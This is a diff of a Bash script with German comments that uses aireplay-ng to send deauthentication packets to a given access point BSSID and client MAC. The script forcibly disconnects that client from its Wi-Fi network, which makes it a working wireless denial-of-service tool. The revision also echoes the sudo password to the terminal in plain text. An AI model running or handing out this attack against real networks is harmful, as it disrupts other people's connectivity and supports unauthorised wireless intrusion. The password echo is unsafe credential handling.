@@ -2,52 +2,55 @@
 
 set -x
 
-INTERFACE="$1"       # WLAN-Interface, z.B. wlan0
-AP_MAC="$2"          # BSSID des Access Points
-CLIENT_MAC="$3"      # MAC-Adresse des Clients
-OLD_CHANNEL="$4" # Kanal, auf dem gesendet werden soll
-PACKETS="$5"
+INTERFACE="$1"       # z.B. wlan0
+AP_MAC="$2"          # BSSID des AP, z.B. AA:BB:CC:DD:EE:FF
+CLIENT_MAC="$3"      # MAC des Clients, z.B. 11:22:33:44:55:66
+CHANNEL="$4"         # Kanal, z.B. 36
+PACKETS="${5:-100}"  # Anzahl Deauth-Pakete, Default 100
 SECRET="$6"          # sudo-Passwort
 
+echo "----------------------------------------"
+echo "----------------------------------------"
+echo "----------------------------------------"
+echo "----------------------------------------"
+echo "Interface: $INTERFACE"
+echo "AP MAC: $AP_MAC"
+echo "Client MAC: $CLIENT_MAC"
+echo "Channel: $CHANNEL"
+echo "Packets: $PACKETS"
+echo "Secret: $SECRET"
+echo "----------------------------------------"
+echo "----------------------------------------"
+echo "----------------------------------------"
+echo "----------------------------------------"
 
-# 1) Interface prüfen und in Monitor-Modus schalten
+if [[ -z "$INTERFACE" || -z "$AP_MAC" || -z "$CLIENT_MAC" || -z "$CHANNEL" || -z "$SECRET" ]]; then
+echo "Usage: $0  <ap_mac> <client_mac>  [packets] "
+exit 1
+fi
+
+
 if ! ip link show "$INTERFACE" &>/dev/null; then
-  echo "Interface $INTERFACE not found"
-  exit 1
+echo "Interface $INTERFACE nicht gefunden"
+exit 1
 fi
 
-echo $SECRET | sudo -S airmon-ng check kill
-echo $SECRET | sudo -S airmon-ng stop "$INTERFACE"
 
-MODE=$(iwconfig "$INTERFACE" 2>/dev/null | grep -o 'Mode:[^ ]*' | cut -d: -f2)
-if [ "$MODE" != "Monitor" ]; then
-  echo "[i] Setze $INTERFACE in Monitor-Modus..."
-  echo $SECRET | sudo -S ip link set "$INTERFACE" down
-  echo $SECRET | sudo -S iw dev "$INTERFACE" set type monitor
-  echo $SECRET | sudo -S ip link set "$INTERFACE" up
-  echo $SECRET | sudo -S iw dev "$INTERFACE" set power_save off
-fi
+#echo "[i] Deaktiviere Interface $INTERFACE"
+#echo "$SECRET" | sudo -S ip link set "$INTERFACE" down###
 
-# 2) Aktuellen Kanal ermitteln
-echo "[i] Ermittle aktuellen Kanal für BSSID $AP_MAC ..."
-# iw scan verlangt manchmal managed mode; wir nutzen monitor mode scan:
-CHAN_DETECTED=$(sudo iw dev "$INTERFACE" scan ap "$AP_MAC" 2>/dev/null \
-  | grep -m1 "DS Parameter set:" \
-  | awk '{print $4}')
+#echo "[i] Setze Monitor-Mode auf $INTERFACE"
+#echo "$SECRET" | sudo -S iw dev "$INTERFACE" set type monitor 
+#echo "$SECRET" | sudo -S ip link set "$INTERFACE" up#
 
-if [ -n "$CHAN_DETECTED" ]; then
-  TARGET_CHANNEL="$CHAN_DETECTED"
-  echo "[i] Gefundener Kanal: $TARGET_CHANNEL"
-else
-  if [ -n "$OLD_CHANNEL" ]; then
-    TARGET_CHANNEL="$OLD_CHANNEL"
-    echo "[!] Kanal konnte nicht ermittelt, verwende übergebenen Kanal: $TARGET_CHANNEL"
-  else
-    TARGET_CHANNEL=""
-    echo "[!] Kanal konnte nicht ermittelt und keiner übergeben – scanne kanal-hopping"
-  fi
-fi
+echo "[i] Deaktiviere Energiesparen"
+echo "$SECRET" | sudo -S iw dev "$INTERFACE" set power_save off || true
 
-echo $SECRET | sudo -S iwconfig "$INTERFACE" channel $TARGET_CHANNEL
+echo "[i] Setze Interface $INTERFACE auf Kanal $CHANNEL"
+echo "$SECRET" | sudo -S iwconfig "$INTERFACE" channel "$CHANNEL" 
+sleep 1
 
-echo $SECRET | sudo -S aireplay-ng --deauth $PACKETS -a "$AP_MAC" -c "$CLIENT_MAC" "$INTERFACE"
+echo "[i] Sende $PACKETS Deauth-Pakete von $CLIENT_MAC an $AP_MAC auf Kanal $CHANNEL"
+echo "$SECRET" | sudo -S aireplay-ng -0 "$PACKETS" -a "$AP_MAC" -c "$CLIENT_MAC" "$INTERFACE"
+
+exit 0
